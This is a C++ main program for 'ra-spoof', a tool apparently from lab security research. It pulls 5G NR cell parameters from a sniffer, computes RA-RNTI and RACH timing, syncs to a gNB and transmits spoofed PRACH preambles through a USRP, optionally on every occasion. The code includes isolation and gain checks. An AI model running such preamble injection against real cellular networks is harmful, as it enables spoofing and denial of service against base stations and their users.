// ra-spoof main — Msg1 PRACH preamble injection
//
// Phase 1 (M1): Pull PRACH config from InfluxDB (sniffer live feed),
// compute the RACH occasion, and transmit ONE preamble at the UL center freq.
// Expected outcome: gNB logs "PRACH detected" + emits RAR on the computed RA-RNTI.
//
// Safety: TX requires --confirm-rf-isolated; use --dry-run for offline testing.

#include "cell_config.h"
#include "influx_reader.h"
#include "prach_tx.h"
#include "ra_rnti.h"
#include "ro.h"
#include "log_csv.h"

#include <cstdio>
#include <cstring>
#include <csignal>
#include <getopt.h>
#include <cstdlib>
#include <string>
#include <chrono>
#include <thread>

static volatile bool g_running = true;

static void sig_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf("\n[main] Shutting down (signal %d)...\n", sig);
        g_running = false;
    }
}

static void print_usage(const char* prog) {
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -c, --config PATH         Path to ra-spoof.yaml (default: configs/ra-spoof.yaml)\n");
    printf("  -g, --gnb-config PATH     Path to gnb.yaml (fallback only, default: /home/avi/Downloads/gnb.yaml)\n");
    printf("  --influx-host HOST        InfluxDB host (default: localhost)\n");
    printf("  --influx-port PORT        InfluxDB port (default: 8086)\n");
    printf("  --influx-org ORG          InfluxDB org (default: rtu)\n");
    printf("  --influx-bucket BUCKET    InfluxDB bucket (default: rtusystem)\n");
    printf("  --influx-data-id ID       Sniffer data_id tag (default: test)\n");
    printf("  --no-influx               Skip InfluxDB; use gnb.yaml only\n");
    printf("  --dry-run                 Run pipeline without RF TX\n");
    printf("  --confirm-rf-isolated     Required flag: confirms Faraday cage isolation\n");
    printf("  --tx-gain DB              TX gain in dB (default: 30, max: 70)\n");
    printf("  --device-args ARGS        UHD device args (default: type=b200)\n");
    printf("  --continuous              Transmit continuously on every RO (Ctrl-C to stop)\n");
    printf("  -h, --help                Print this help\n");
    printf("\nEnvironment:\n");
    printf("  INFLUX_TOKEN              InfluxDB auth token (required unless --no-influx)\n");
}

static void print_banner() {
    printf("\n");
    printf("  ================================================================\n");
    printf("   5G NR Msg1 PRACH Preamble Injector — ra-spoof\n");
    printf("   WARNING: For authorized Faraday-cage security research only.\n");
    printf("  ================================================================\n\n");
}

int main(int argc, char* argv[]) {
    print_banner();

    // --- CLI parsing ---
    std::string gnb_config_path = "/home/avi/Downloads/gnb.yaml";
    std::string config_path     = "configs/ra-spoof.yaml";
    bool        dry_run         = false;
    bool        rf_isolated     = false;
    bool        no_influx       = false;
    bool        continuous      = false;
    double      tx_gain         = 30.0;
    std::string device_args     = "type=b200";

    influx_cfg icfg;
    icfg.host    = "localhost";
    icfg.port    = 8086;
    icfg.org     = "rtu";
    icfg.bucket  = "rtusystem";
    icfg.data_id = "test";

    static struct option long_opts[] = {
        {"config",              required_argument, 0, 'c'},
        {"gnb-config",          required_argument, 0, 'g'},
        {"influx-host",         required_argument, 0, 'H'},
        {"influx-port",         required_argument, 0, 'P'},
        {"influx-org",          required_argument, 0, 'O'},
        {"influx-bucket",       required_argument, 0, 'B'},
        {"influx-data-id",      required_argument, 0, 'I'},
        {"no-influx",           no_argument,       0, 'N'},
        {"dry-run",             no_argument,       0, 'D'},
        {"confirm-rf-isolated", no_argument,       0, 'R'},
        {"tx-gain",             required_argument, 0, 'G'},
        {"device-args",         required_argument, 0, 'A'},
        {"continuous",          no_argument,       0, 'T'},
        {"help",                no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int c;
    while ((c = getopt_long(argc, argv, "c:g:h", long_opts, nullptr)) != -1) {
        switch (c) {
            case 'c': config_path     = optarg; break;
            case 'g': gnb_config_path = optarg; break;
            case 'H': icfg.host       = optarg; break;
            case 'P': icfg.port       = atoi(optarg); break;
            case 'O': icfg.org        = optarg; break;
            case 'B': icfg.bucket     = optarg; break;
            case 'I': icfg.data_id    = optarg; break;
            case 'N': no_influx       = true; break;
            case 'D': dry_run         = true; break;
            case 'R': rf_isolated     = true; break;
            case 'G': tx_gain         = atof(optarg); break;
            case 'A': device_args     = optarg; break;
            case 'T': continuous      = true; break;
            case 'h': print_usage(argv[0]); return 0;
            default:  print_usage(argv[0]); return 1;
        }
    }

    // Safety checks
    if (tx_gain > 70.0) {
        fprintf(stderr, "FATAL: TX gain %.1f dB exceeds safety cap (70 dB). Refusing.\n", tx_gain);
        return 1;
    }
    if (!rf_isolated && !dry_run) {
        fprintf(stderr, "FATAL: RF TX requires --confirm-rf-isolated flag.\n"
                        "       Use --dry-run for offline testing.\n");
        return 1;
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // -----------------------------------------------------------------------
    // Step 1: Load cell config
    // Primary source: InfluxDB (live from sniffer).
    // Fallback (--no-influx): gnb.yaml.
    // -----------------------------------------------------------------------
    cell_config cfg;
    bool influx_ok = false;

    if (!no_influx) {
        printf("[main] Step 1: Pulling cell config from InfluxDB...\n");
        influx_ok = influx_pull_cell_config(icfg, cfg);

        if (!influx_ok) {
            fprintf(stderr, "[main] FATAL: InfluxDB pull failed.\n"
                            "       Ensure the sniffer is running and has received SIB1.\n"
                            "       Use --no-influx to fall back to gnb.yaml (stale data).\n");
            return 1;
        }

        // Sanity-check against lab ground truth (logs warnings but does not abort)
        influx_sanity_check(cfg);

    } else {
        printf("[main] Step 1: --no-influx: loading cell config from gnb.yaml...\n");
        if (!parse_gnb_config(gnb_config_path, cfg)) {
            fprintf(stderr, "[main] FATAL: Cannot parse gNB config from %s\n", gnb_config_path.c_str());
            return 1;
        }
        printf("[main] WARNING: Using static gnb.yaml config — PRACH params may be stale.\n");
    }

    print_cell_config(cfg);

    // -----------------------------------------------------------------------
    // Step 2: Compute RA-RNTI
    // t_id = prach_subframe (= slot index of the PRACH occasion within SFN)
    // For config_idx=1: subframe 4 → t_id=4
    // RA-RNTI = 1 + 0 + 14*4 + 0 + 0 = 57 = 0x39
    // -----------------------------------------------------------------------
    uint32_t s_id         = 0;                  // first symbol of PRACH in slot
    uint32_t t_id         = cfg.prach_subframe;  // slot index within SFN (=4 for config_idx=1)
    uint32_t f_id         = 0;                  // msg1-FDM=1 → single frequency domain occasion
    uint32_t ul_carrier   = 0;                  // NUL carrier

    uint16_t ra_rnti = compute_ra_rnti(s_id, t_id, f_id, ul_carrier);

    printf("\n[main] Step 2: RA-RNTI computation:\n");
    printf("  RA-RNTI = 1 + s_id(%u) + 14*t_id(%u) + 14*80*f_id(%u) + 14*80*8*ul_carrier(%u)\n",
           s_id, t_id, f_id, ul_carrier);
    printf("  RA-RNTI = 0x%04x (%u)\n", ra_rnti, ra_rnti);

    // Sanity: for this lab setup we expect 57
    if (ra_rnti != 57) {
        fprintf(stderr, "[main] WARNING: computed RA-RNTI=%u, expected 57 for this config\n", ra_rnti);
        fprintf(stderr, "               Check prach_subframe value in cell_config\n");
    } else {
        printf("  [OK] RA-RNTI matches expected value 57\n");
    }

    // -----------------------------------------------------------------------
    // Step 3: Find next PRACH occasion
    // -----------------------------------------------------------------------
    printf("\n[main] Step 3: RACH occasion timing:\n");
    printf("  config_idx=%u → subframe %u, SFN %% %u == %u\n",
           cfg.prach_config_idx, cfg.prach_subframe, cfg.prach_x, cfg.prach_y);

    // Print a few upcoming occasions for reference
    ro::print_occasions_in_range(cfg, 0, 200); // first 200 system slots

    // Pick the first occasion after slot 0 (we'll transmit at the first one)
    uint32_t ro_sys_slot = ro::next_occasion_slot(cfg, 0);
    uint32_t ro_sfn, ro_slot_in_frame;
    ro::from_system_slot(ro_sys_slot, ro_sfn, ro_slot_in_frame);

    printf("\n[main] Target RO: SFN=%u, slot=%u (system_slot=%u)\n",
           ro_sfn, ro_slot_in_frame, ro_sys_slot);

    // -----------------------------------------------------------------------
    // Step 4: Initialize PRACH TX
    // -----------------------------------------------------------------------
    printf("\n[main] Step 4: Initializing PRACH TX...\n");
    prach_tx ptx;
    if (!ptx.init(cfg, tx_gain, dry_run)) {
        fprintf(stderr, "[main] FATAL: prach_tx::init failed\n");
        return 1;
    }

    // -----------------------------------------------------------------------
    // Step 5: Open USRP
    // -----------------------------------------------------------------------
    printf("\n[main] Step 5: Opening USRP (B210)...\n");
    if (!ptx.open_rf(device_args)) {
        fprintf(stderr, "[main] FATAL: Failed to open USRP\n");
        return 1;
    }

    // -----------------------------------------------------------------------
    // Step 6: Initialize logging
    // -----------------------------------------------------------------------
    log_csv::init("ra-spoof_msg1.csv");

    // -----------------------------------------------------------------------
    // Step 6.5: Synchronize to SSB for device-time ↔ SFN/slot mapping
    // -----------------------------------------------------------------------
    printf("\n[main] Step 6.5: Synchronizing to gNB SSB (PCI=%u)...\n", cfg.pci);

    // Pre-load sniffer MIB timing as fallback (for when B210 RX is unavailable)
    if (!no_influx) {
        uint32_t fb_sfn=0, fb_ssb_idx=0, fb_ssb_slot=0, fb_scs=0;
        bool fb_hrf=false;
        double fb_unix_time=0.0;
        if (influx_pull_mib_timing(icfg, &fb_sfn, &fb_ssb_idx, &fb_hrf,
                                   &fb_ssb_slot, &fb_scs, &fb_unix_time)) {
            ptx.set_sync_fallback(fb_unix_time, fb_sfn, fb_ssb_slot);
        } else {
            printf("[main] WARNING: Could not pull MIB timing from sniffer "
                   "(no fallback available)\n");
        }
    }

    if (!ptx.sync_to_ssb()) {
        fprintf(stderr, "[main] FATAL: SSB sync failed — cannot align TX to gNB timing.\n"
                        "       Check: USRP connected, antenna attached, DL freq correct.\n");
        log_csv::close();
        return 1;
    }
    printf("[main] SSB sync OK. Recomputing RO from live timing...\n");

    // Recompute the first RO using the actual sync SFN/slot as the base,
    // so we target a genuinely upcoming occasion.
    uint32_t sync_sys_slot = ro::system_slot(ptx.get_sync_sfn(), ptx.get_sync_slot());
    ro_sys_slot = ro::next_occasion_slot(cfg, sync_sys_slot);
    ro::from_system_slot(ro_sys_slot, ro_sfn, ro_slot_in_frame);

    // Also update the Step 3-printed target:
    printf("[main] Updated Target RO: SFN=%u, slot=%u (system_slot=%u)\n",
           ro_sfn, ro_slot_in_frame, ro_sys_slot);

    // -----------------------------------------------------------------------
    // Step 7: Transmit preamble(s)
    // -----------------------------------------------------------------------
    printf("\n[main] Step 7: Transmitting PRACH preamble (Msg1)...\n");

    if (continuous) {
        printf("[main] Continuous mode: transmitting on every RO (Ctrl-C to stop).\n");
        printf("[main] RO interval: 16 frames = 160 ms.\n");
    }

    uint32_t  tx_ro_sys_slot = ro_sys_slot;
    uint32_t  tx_ro_sfn      = ro_sfn;
    uint32_t  tx_ro_slot     = ro_slot_in_frame;
    uint32_t  tx_count       = 0;
    uint32_t  tx_ok_count    = 0;
    double    last_tx_time    = 0.0;  // device time of last TX
    const double ro_interval_s = 0.160; // 16 frames at 10ms each

    do {
        if (continuous && tx_count > 0) {
            printf("\n--- Transmission %u (loop) ---\n", tx_count + 1);
        }

        bool tx_ok;
        if (continuous && tx_count > 0 && last_tx_time > 0.0) {
            // Continuous mode after 1st TX: add 160ms to previous TX time
            last_tx_time += ro_interval_s;
            tx_ok = ptx.transmit_at_time(last_tx_time, tx_ro_sfn, tx_ro_slot);
        } else {
            tx_ok = ptx.transmit_preamble(tx_ro_sfn, tx_ro_slot);
            last_tx_time = ptx.get_last_tx_time();
        }

        if (tx_ok) {
            tx_ok_count++;
            if (!continuous) {
                printf("\n[main] ========== SUCCESS ==========\n");
            }
            printf("[main] PRACH preamble transmitted [%u/%u OK]\n", tx_ok_count, tx_count + 1);

            log_csv::log_event("Msg1_PRACH",
                               tx_ro_sys_slot, tx_ro_sfn, tx_ro_slot,
                               ra_rnti, 0 /* RAPID */, tx_gain,
                               0 /* on_air_time */,
                               "transmitted");
        } else {
            fprintf(stderr, "[main] PRACH transmission %u failed\n", tx_count + 1);
            log_csv::log_event("Msg1_PRACH",
                               tx_ro_sys_slot, tx_ro_sfn, tx_ro_slot,
                               ra_rnti, 0, tx_gain, 0, "failed");
        }

        if (!continuous) break;

        tx_count++;

        // Compute the next RO
        tx_ro_sys_slot = ro::next_occasion_slot(cfg, tx_ro_sys_slot);
        ro::from_system_slot(tx_ro_sys_slot, tx_ro_sfn, tx_ro_slot);

        printf("[main] Next RO: SFN=%u slot=%u (system_slot=%u)\n",
               tx_ro_sfn, tx_ro_slot, tx_ro_sys_slot);

        // The transmit_preamble call schedules TX ~100ms ahead and blocks
        // until the burst completes. The RO interval is 160ms, so after
        // the block returns we only need ~60ms of slack.
        // Sleep a minimal interval to avoid spinning, letting the next
        // call's 100ms lookahead hit the upcoming RO window.
        std::this_thread::sleep_for(std::chrono::milliseconds(30));

    } while (g_running);

    // Print summary for continuous mode
    if (continuous) {
        printf("\n[main] ========== SUMMARY ==========\n");
        printf("[main] Total transmissions: %u\n", tx_count);
        printf("[main] Successful:          %u\n", tx_ok_count);
        printf("[main] Failures:            %u\n", tx_count - tx_ok_count);
    }

    printf("[main] Expected gNB behavior:\n");
    printf("  1. gNB log: 'PRACH detected preamble=0 TA=...' \n");
    printf("  2. gNB emits RAR (Msg2) in PDCCH/PDSCH with RA-RNTI=0x%04x (%u)\n",
           ra_rnti, ra_rnti);
    printf("  3. Sniffer may capture RAR in the pcap or InfluxDB\n");
    printf("[main] Check gNB log: tail -f /tmp/gnb.log | grep -E 'PRACH|preamble|RAR|ra_rnti'\n");

    log_csv::close();

    printf("\n[main] Log written to ra-spoof_msg1.csv\n");
    printf("[main] Done.\n\n");

    int ret = (tx_ok_count > 0) ? 0 : 1;

    // Flush all stdio buffers before _exit'ing to avoid the srslog
    // atexit crash on GCC 14+ while still preserving console output.
    fflush(stdout);
    fflush(stderr);

    _exit(ret);
}
